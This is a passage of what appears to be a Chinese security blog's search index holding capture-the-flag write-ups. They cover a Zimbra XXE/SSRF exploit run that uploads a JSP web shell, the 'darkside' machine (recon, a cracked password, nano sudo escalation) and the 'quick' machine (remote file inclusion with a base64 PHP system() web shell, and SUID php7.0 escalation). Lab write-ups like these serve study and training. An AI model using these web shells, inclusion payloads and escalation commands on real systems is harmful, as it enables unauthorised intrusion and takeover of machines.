访问shell要添加cookie,ZM_ADMIN_AUTH_TOKEN=0_327aeb35e11ac68ab87105b3667972569f9cfa4d_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313735323839363931353837373b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3538313139373535333b; (base) ZimbraExploit [master●●] python3 Zimbra_Rce.py https://10.0.0.12/Found existing alias for python3. You should use: phttps://10.0.0.12[*] Get User Name/Password By XXEzimbrarhqkAlU5n_[*] Get Low Privilege Auth Token[*] Get Admin Auth Token By SSRF[*] Uploading fileShell: https://10.0.0.12/downloads/c.jsp[*] Request Result:May need cookie:ZM_ADMIN_AUTH_TOKEN=0_327aeb35e11ac68ab87105b3667972569f9cfa4d_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313735323839363931353837373b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3538313139373535333b;","tags":["zimbra-rce"]},{"title":"darkside","path":"/2025/07/07/darkside/","content":"darkside 靶机ip: 192.168.1.97 攻击机ip: 192.168.1.93 信息收集(base) Downloads nmap -sC -sV -p- 192.168.1.97Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 18:05 CSTNmap scan report for 192.168.1.97Host is up (0.0050s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)| ssh-hostkey:| 3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)| 256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)|_ 256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)80/tcp open http Apache httpd 2.4.56 ((Debian))|_http-title: The DarkSide| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.56 (Debian)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds (pwncat) ➜ Downloads feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,md -u http://192.168.1.97 -C 404 -d 1 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben epi Risher 🤓 ver: 2.11.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.1.97 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 💢 Status Code Filters │ [404] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.11.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php, html, txt, bak, md] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 29l 45w 683c http://192.168.1.97/index.php200 GET 74l 300w 2121c http://192.168.1.97/styles.css200 GET 29l 45w 683c http://192.168.1.97/301 GET 9l 28w 313c http://192.168.1.97/backup = http://192.168.1.97/backup/ (base) Downloads curl http://192.168.1.97/backup/vote.txtrijaba: Yesxerosec: Yessml: Nocromiphi: Nogatogamer: Nochema: Yestalleyrand: Nod3b0o: YesSince the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin. (base) Downloads curl http://192.168.1.97/backup/vote.txt vote.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 205 100 205 0 0 4191 0 --:--:-- --:--:-- --:--:-- 4270(base) Downloads cat vote.txt | awk -F : print $1 | grep -Ev ^$ | grep -Ev Since* user.txt(base) Downloads echo kevin user.txt 后台密码爆破这里跑的太慢了，最后看wp找密码 kevin/iloveyou 解密出来是 sfqekmgncutjhbypvxda.onion 修改Cookie 最终获得 kevin:ILoveCalisthenics kevin@darkside:~$ ls -altotal 32drwxr-xr-x 3 kevin kevin 4096 Oct 30 2023 .drwxr-xr-x 4 root root 4096 Oct 15 2023 ..lrwxrwxrwx 1 kevin kevin 9 Oct 30 2023 .bash_history - /dev/null-rw-r--r-- 1 kevin kevin 220 Oct 15 2023 .bash_logout-rw-r--r-- 1 kevin kevin 3526 Oct 15 2023 .bashrc-rw-r--r-- 1 kevin kevin 113 Oct 15 2023 .historydrwxr-xr-x 3 kevin kevin 4096 Oct 15 2023 .local-rw-r--r-- 1 kevin kevin 807 Oct 15 2023 .profile-rw-r--r-- 1 kevin kevin 19 Oct 15 2023 user.txtkevin@darkside:~$ cat .historyls -alhostname -Iecho Congratulations on the OSCP Xerosectopps -fauxsu rijabaILoveJabitals /home/rijabakevin@darkside:~$ su - rijabaPassword:rijaba@darkside:~$ nano提权rijaba@darkside:~$ sudo -lMatching Defaults entries for rijaba on darkside: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser rijaba may run the following commands on darkside: (root) NOPASSWD: /usr/bin/nanorijaba@darkside:~$ nano^R^Xreset; bash 10 20","tags":["后台密码爆破","nano提权"]},{"title":"quick","path":"/2025/06/11/quick/","content":"使用fscan扫描发现开启了80端口，访问页面 点击下面的Home、Cars等会出现参数?page=xxxx，猜测有文件包含，但是使用php伪协议没有包含成功，尝试远程包含，本机开启服务器 echo test 1.phppython -m http.server 8089 发现成功访问了我的http服务器上的1.php 漏洞利用data:伪协议可以直接传数据，不用包含远程服务器上的文件 ?php system($_POST[1]);? =data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4= 远程文件包含法在攻击机启动一个http服务器 python -m http.server 8089 服务器上写一个shell.php ?phpsystem($_POST[1]);? 因为这里代码应该是$filename . .php的类型，要过滤后面的.php可以在后面使用?和# 使用配置 php提权尝试suid提权 find / -perm -4000 -type f 2/dev/null 发现php7.0具有suid权限,但是在蚁剑终端里面不能提权，反弹shell出来 然后使用命令 cd /usr/binCMD=/bin/sh./php7.0 -r pcntl_exec(/bin/sh, [-p]);","tags":["data伪协议","远程文件包含","php提权"]}]